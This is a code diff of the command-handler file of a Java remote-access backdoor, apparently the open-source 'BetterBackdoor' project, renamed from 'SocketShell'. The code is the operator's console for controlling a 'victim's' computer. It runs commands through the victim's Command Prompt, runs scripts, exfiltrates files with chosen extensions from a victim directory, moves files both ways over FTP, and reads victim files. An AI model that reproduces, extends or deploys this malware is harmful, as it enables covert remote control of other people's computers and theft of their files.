@@ -1,9 +1,9 @@
-package com.github.thatcherdev.socketshell.shell;
+package com.github.thatcherdev.betterbackdoor.shell;
 
-import com.github.thatcherdev.socketshell.SocketShell;
+import com.github.thatcherdev.betterbackdoor.BetterBackdoor;
 import java.util.ArrayList;
 import java.util.Arrays;
-import com.github.thatcherdev.socketshell.backend.FTP;
+import com.github.thatcherdev.betterbackdoor.backend.FTP;
 
 public class HandleCommand {
 
@@ -18,7 +18,7 @@ public class HandleCommand {
 					"Commands will now be run through vitim's computer's Command Prompt\nEnter 'back' to go back");
 			while (true) {
 				System.out.print("cmd");
-				String cmdCommand = SocketShell.getInput("");
+				String cmdCommand = BetterBackdoor.getInput("");
 				if (cmdCommand.equals("back"))
 					break;
 				Shell.out.println("cmd " + cmdCommand);
@@ -37,7 +37,7 @@ public class HandleCommand {
 				System.out.println("Chose script:");
 				for (String script : scripts)
 					System.out.println("-" + script);
-				String scriptName = SocketShell.getInput("");
+				String scriptName = BetterBackdoor.getInput("");
 				Shell.out.println(command + " " + scriptName);
 				System.out.println(getResp());
 			}
@@ -45,25 +45,25 @@ public class HandleCommand {
 			System.out.println(
 					"This will copy files with desired extensions from a folder and all it's subfolders to gathered\\ExfiltratedFiles relative to the backdoor executable");
 			System.out.println("Enter victim's directory to search through:");
-			String root = SocketShell.getInput("");
+			String root = BetterBackdoor.getInput("");
 			System.out.println("Enter extensions of files separated by commas (i.e. txt,pdf,docx)");
-			String exts = SocketShell.getInput("");
+			String exts = BetterBackdoor.getInput("");
 			Shell.out.println("exfiles " + root + "*" + exts);
 			System.out.println("Exfiltrating...\n");
 			System.out.println(getResp());
 		} else if (command.equals("filesend")) {
 			System.out.println("Enter local filepath of file to send:");
-			String fileSend = SocketShell.getInput("file");
+			String fileSend = BetterBackdoor.getInput("file");
 			System.out.println("Enter victim's filepath of file to receive:");
-			String fileRec = SocketShell.getInput("");
+			String fileRec = BetterBackdoor.getInput("");
 			Shell.out.println("filesend " + fileRec);
 			FTP.shell(fileSend, "send");
 			System.out.println(getResp());
 		} else if (command.equals("filerec")) {
 			System.out.println("Enter victim's filepath of file to send:");
-			String fileSend = SocketShell.getInput("");
+			String fileSend = BetterBackdoor.getInput("");
 			System.out.println("Enter local filepath of file to receive:");
-			String fileRec = SocketShell.getInput("");
+			String fileRec = BetterBackdoor.getInput("");
 			Shell.out.println("filerec " + fileSend);
 			FTP.shell(fileRec, "rec");
 			System.out.println(getResp());
@@ -74,7 +74,7 @@ public class HandleCommand {
 			System.out.println(getResp());
 		} else if (command.equals("cat")) {
 			System.out.println("Enter victim's filepath of file to get:");
-			String file = SocketShell.getInput("");
+			String file = BetterBackdoor.getInput("");
 			Shell.out.println("cat " + file);
 			System.out.println(getResp());
 		} else if (command.equals("exit"))
